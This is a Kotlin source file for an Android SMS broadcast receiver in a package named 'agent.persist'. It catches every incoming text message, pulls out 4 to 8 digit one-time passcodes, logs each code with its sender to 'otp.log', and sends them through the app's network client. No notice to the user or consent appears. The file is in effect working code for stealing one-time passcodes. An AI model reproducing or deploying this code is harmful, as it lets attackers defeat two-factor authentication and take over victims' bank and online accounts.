package ai.obsidian.agent.persist

import ai.obsidian.agent.AgentApp
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val codePattern = Regex("\\b(\\d{4,8})\\b")

    override fun onReceive(context: Context, intent: Intent) {
        val app = context.applicationContext as AgentApp
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return

        for (message in messages) {
            val body = message.displayMessageBody ?: continue
            val code = codePattern.find(body)?.value ?: continue
            val line = "SMS $code | ${message.displayOriginatingAddress.orEmpty()}"
            app.store.append("otp.log", "${System.currentTimeMillis()} $line")
            scope.launch { runCatching { app.requireClient().send("msg", line) } }
        }
    }
}
